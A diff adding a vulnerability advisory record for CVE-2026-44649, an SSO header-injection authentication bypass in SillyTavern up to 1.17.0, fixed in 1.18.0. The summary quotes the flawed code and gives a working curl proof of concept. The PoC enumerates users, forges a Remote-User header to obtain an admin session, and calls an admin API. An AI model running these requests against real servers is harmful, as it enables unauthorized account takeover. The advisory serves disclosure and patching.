@@ -1,0 +1,170 @@
+advisory_id: GHSA-gxx6-h3g6-vwjh
+datasource_id: github_osv/GHSA-gxx6-h3g6-vwjh
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-gxx6-h3g6-vwjh/GHSA-gxx6-h3g6-vwjh.json
+aliases:
+  - CVE-2026-44649
+summary: "SillyTavern has Authentication Bypass via SSO Header Injection\n## Resolution\n\n\
+  SillyTavern 1.18.0 now includes a configuration option to limit which IP addresses can authorize\
+  \ using SSO headers, limiting to just loopback addresses by default. A setting can be customized\
+  \ according to user's needs.\n\nDocumentation: https://docs.sillytavern.app/administration/sso/\n\
+  \n## Summary\n\nSillyTavern accepts `Remote-User` (Authelia) and `X-Authentik-Username` (Authentik)\
+  \ HTTP\nheaders to automatically log in users when SSO is configured. There is no validation\
+  \ that\nthese headers originate from a trusted reverse proxy. Any network client that can\
+  \ reach\nthe SillyTavern port directly can inject these headers and authenticate as any user,\n\
+  including administrators, without a password. This vulnerability is exploitable only when\
+  \ `sso.autheliaAuth: true` or\n`sso.authentikAuth: true` is set in `config.yaml` (both default\
+  \ to `false`).\n\n### Detials\n\nSillyTavern implements header-based SSO for Authelia and\
+  \ Authentik. When enabled, the\n`tryAutoLogin` function (called on every request to `/login`)\
+  \ invokes `headerUserLogin`,\nwhich reads an HTTP header set by the upstream proxy and automatically\
+  \ creates an\nauthenticated session for the matching user:\n\n`src/users.js:779-801`:\n\n\
+  ```js\nasync function headerUserLogin(request, header = 'Remote-User') {\n    if (!request.session)\
+  \ { return false; }\n\n    const remoteUser = request.get(header);  // reads any header from\
+  \ any client\n    if (!remoteUser) { return false; }\n\n    const userHandles = await getAllUserHandles();\n\
+  \    for (const userHandle of userHandles) {\n        if (remoteUser.toLowerCase() === userHandle)\
+  \ {\n            const user = await storage.getItem(toKey(userHandle));\n            if (user\
+  \ && user.enabled) {\n                request.session.handle = userHandle; \n            \
+  \    return true;\n            }\n        }\n    }\n    return false;\n}\n```\n\n`request.get(header)`\
+  \ is Express's wrapper for `req.headers[name.toLowerCase()]`.\nExpress does not distinguish\
+  \ between headers set by a trusted upstream proxy and headers\ninjected by the end client.\
+  \ Without an IP allowlist check, any client can set\n`Remote-User: ` and receive an authenticated\
+  \ session cookie.\n\n### User Enumeration Pre-Condition\n\nThe `/api/users/list` endpoint\
+  \ is registered before `requireLoginMiddleware` in\n`src/server-main.js:236`, making it publicly\
+  \ accessible without authentication:\n\n`src/server-main.js:236,239`:\n```js\napp.use('/api/users',\
+  \ usersPublicRouter);  // line 236 (public)\napp.use(requireLoginMiddleware);           //\
+  \ line 239 (auth gate)\n```\n\n`src/endpoints/users-public.js:26-57`:\n```js\nrouter.post('/list',\
+  \ async (_request, response) => {\n    if (DISCREET_LOGIN) { return response.sendStatus(204);\
+  \ }\n    const users = await storage.values(x => x.key.startsWith(KEY_PREFIX));\n    return\
+  \ response.json(viewModels);  // returns handle, name, avatar, admin, password flags\n});\n\
+  ```\n\nThis allows an attacker to enumerate all user handles (including admin handles) without\n\
+  any prior credentials.\n\n## PoC\n\n```bash\nTARGET=\"http://localhost:8000\"\n\n# enumerate\
+  \ users\ncurl -s -X POST \"$TARGET/api/users/list\" -H \"Content-Type: application/json\"\
+  \ -d '{}'\n\n# inject Remote-User header, receive authsession\ncurl -s -L \\\n  -H \"Remote-User:\
+  \ admin-user\" \\\n  -c /tmp/st-session.txt \\\n  \"$TARGET/login\"\n\n\n# obtain CSRF token,\
+  \ call admin API\nTOKEN=$(curl -s -b /tmp/st-session.txt \"$TARGET/csrf-token\" | python3\
+  \ -c \"import sys,json; print(json.load(sys.stdin)['token'])\")\n\ncurl -s -X POST \"$TARGET/api/users/admin/get\"\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"X-CSRF-Token: $TOKEN\" \\\n  -b /tmp/st-session.txt\
+  \ \\\n  -d '{}'\n```\n\n---\n\n## Impact\n\nAn account takeover, allowing an attacker to do\
+  \ anything a legitimately authorized user can do."
+impacted_packages:
+  - purl: pkg:npm/sillytavern
+    affected_versions: vers:npm/<=1.17.0
+    fixed_versions: vers:npm/1.18.0
+    affected_packages:
+      - pkg:npm/sillytavern@1.4.1
+      - pkg:npm/sillytavern@1.4.2
+      - pkg:npm/sillytavern@1.4.3
+      - pkg:npm/sillytavern@1.4.4
+      - pkg:npm/sillytavern@1.4.5
+      - pkg:npm/sillytavern@1.4.6
+      - pkg:npm/sillytavern@1.4.7
+      - pkg:npm/sillytavern@1.4.8
+      - pkg:npm/sillytavern@1.4.9
+      - pkg:npm/sillytavern@1.5.0
+      - pkg:npm/sillytavern@1.5.1
+      - pkg:npm/sillytavern@1.5.3
+      - pkg:npm/sillytavern@1.5.4
+      - pkg:npm/sillytavern@1.5.5
+      - pkg:npm/sillytavern@1.6.0
+      - pkg:npm/sillytavern@1.6.1
+      - pkg:npm/sillytavern@1.6.2
+      - pkg:npm/sillytavern@1.6.4
+      - pkg:npm/sillytavern@1.6.5
+      - pkg:npm/sillytavern@1.6.6
+      - pkg:npm/sillytavern@1.6.7
+      - pkg:npm/sillytavern@1.6.8
+      - pkg:npm/sillytavern@1.7.0
+      - pkg:npm/sillytavern@1.7.1
+      - pkg:npm/sillytavern@1.7.2
+      - pkg:npm/sillytavern@1.7.3
+      - pkg:npm/sillytavern@1.8.0
+      - pkg:npm/sillytavern@1.8.1
+      - pkg:npm/sillytavern@1.8.2
+      - pkg:npm/sillytavern@1.8.3
+      - pkg:npm/sillytavern@1.8.4
+      - pkg:npm/sillytavern@1.9.0
+      - pkg:npm/sillytavern@1.9.1
+      - pkg:npm/sillytavern@1.9.2
+      - pkg:npm/sillytavern@1.9.3
+      - pkg:npm/sillytavern@1.9.4
+      - pkg:npm/sillytavern@1.9.5
+      - pkg:npm/sillytavern@1.9.6
+      - pkg:npm/sillytavern@1.9.7
+      - pkg:npm/sillytavern@1.10.0
+      - pkg:npm/sillytavern@1.10.1
+      - pkg:npm/sillytavern@1.10.2
+      - pkg:npm/sillytavern@1.10.3
+      - pkg:npm/sillytavern@1.10.4
+      - pkg:npm/sillytavern@1.10.5
+      - pkg:npm/sillytavern@1.10.6
+      - pkg:npm/sillytavern@1.10.7
+      - pkg:npm/sillytavern@1.10.8
+      - pkg:npm/sillytavern@1.10.9
+      - pkg:npm/sillytavern@1.10.10
+      - pkg:npm/sillytavern@1.11.0
+      - pkg:npm/sillytavern@1.11.1
+      - pkg:npm/sillytavern@1.11.2
+      - pkg:npm/sillytavern@1.11.3
+      - pkg:npm/sillytavern@1.11.4
+      - pkg:npm/sillytavern@1.11.5
+      - pkg:npm/sillytavern@1.11.6
+      - pkg:npm/sillytavern@1.11.7
+      - pkg:npm/sillytavern@1.11.8
+      - pkg:npm/sillytavern@1.12.0-preview
+      - pkg:npm/sillytavern@1.12.0
+      - pkg:npm/sillytavern@1.12.1
+      - pkg:npm/sillytavern@1.12.2
+      - pkg:npm/sillytavern@1.12.3
+      - pkg:npm/sillytavern@1.12.4
+      - pkg:npm/sillytavern@1.12.5
+      - pkg:npm/sillytavern@1.12.6
+      - pkg:npm/sillytavern@1.12.7
+      - pkg:npm/sillytavern@1.12.8
+      - pkg:npm/sillytavern@1.12.9
+      - pkg:npm/sillytavern@1.12.10
+      - pkg:npm/sillytavern@1.12.11
+      - pkg:npm/sillytavern@1.12.12
+      - pkg:npm/sillytavern@1.12.13
+      - pkg:npm/sillytavern@1.12.14
+      - pkg:npm/sillytavern@1.13.0
+      - pkg:npm/sillytavern@1.13.1
+      - pkg:npm/sillytavern@1.13.2
+      - pkg:npm/sillytavern@1.13.3
+      - pkg:npm/sillytavern@1.13.4
+      - pkg:npm/sillytavern@1.13.5
+      - pkg:npm/sillytavern@1.14.0
+      - pkg:npm/sillytavern@1.16.0
+      - pkg:npm/sillytavern@1.17.0
+    fixed_packages:
+      - pkg:npm/sillytavern@1.18.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-gxx6-h3g6-vwjh/GHSA-gxx6-h3g6-vwjh.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-807
+  - CWE-346
+  - CWE-290
+  - CWE-306
+references:
+  - url: https://github.com/SillyTavern/SillyTavern
+    reference_type:
+    reference_id:
+  - url: https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-gxx6-h3g6-vwjh
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44649
+    reference_type:
+    reference_id:
+exploits: []
